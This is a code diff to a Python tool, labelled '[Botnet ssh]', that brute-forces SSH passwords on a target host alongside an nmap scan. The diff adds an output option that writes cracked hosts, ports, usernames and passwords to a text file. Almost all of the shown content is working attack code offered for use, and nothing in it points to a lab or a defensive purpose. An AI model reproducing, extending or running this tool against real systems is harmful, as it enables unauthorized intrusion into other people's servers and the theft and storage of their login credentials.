@@ -15,7 +15,26 @@ Fails = 0
 
 ssh_info = None
 
+# Export file
+export_file = None
+
 # FONCTIONS
+def verif_file(filename):
+    splited_filename = filename.split('.')
+    if len(splited_filename) == 1:
+        print(f"{Fore.LIGHTRED_EX}[Erreur] : Merci de mettre un nom de fichier avec une extension '.txt' ")
+        exit(0)
+    else:
+        global export_file
+        export_file = filename
+
+def write_export(ip, port, user, password):
+    global export_file
+    with open(export_file, 'w') as f:
+        f.write(f'Host : {ip} port : {port}\n')
+        f.write(f'User : {user} Password : {password}')
+        f.close()
+
 
 def connect(host, user, password):
     global Found
@@ -39,6 +58,7 @@ def brute_force_ssh(host):
     global Found
     global ssh_info
     global Fails
+    global export_file
 
     username = None
 
@@ -55,6 +75,10 @@ def brute_force_ssh(host):
                 print(f"{Fore.BLUE}[Botnet ssh] {Fore.LIGHTGREEN_EX}Access granted {Fore.BLUE}for {Fore.MAGENTA}user "\
                         f"{Fore.BLUE}= {Fore.YELLOW}{username} {Fore.BLUE}and {Fore.MAGENTA}password {Fore.BLUE}= {Fore.YELLOW}{ssh_info['password']} "\
                         f"{Fore.BLUE}in {Fore.WHITE}{Fails} {Fore.BLUE}attempt(s)")
+                
+                if export_file != None:
+                    write_export(ip=host, user=username, password=ssh_info['password'], port=ssh_info['port'])
+
                 exit(0)
             connect(host, username, psswd)
 
@@ -84,16 +108,27 @@ def nmapScan(tgtHost, tgtPort):
 # MAIN
 
 def main():
-    global ssh_info
-    prog = path.basename(argv[0])
+    """Main fonction"""
+    global ssh_info 
+    prog = path.basename(argv[0]) # Get program name
+
     usage = f"[Usage]: {prog} -H <target host> -p <target port>"
-    parser = optparse.OptionParser(usage=usage)
+    parser = optparse.OptionParser(usage=usage) # Initialize parser
+    
     parser.add_option('-H', dest='tgtHost', type='string', \
             help='specify target host\'s IP address.')
 
     parser.add_option('-p', dest='tgtPort', type='string', \
             help='specify target port[s] eparated by comma. Or put - for range: 21-25.')
+    
+    parser.add_option('-o', dest='output_file', type='string', \
+            help='specify destination file', default=None)
+
+
     (options, args) = parser.parse_args()
+
+    if options.output_file != None:
+        verif_file(options.output_file)
 
     tgtHost = options.tgtHost
 
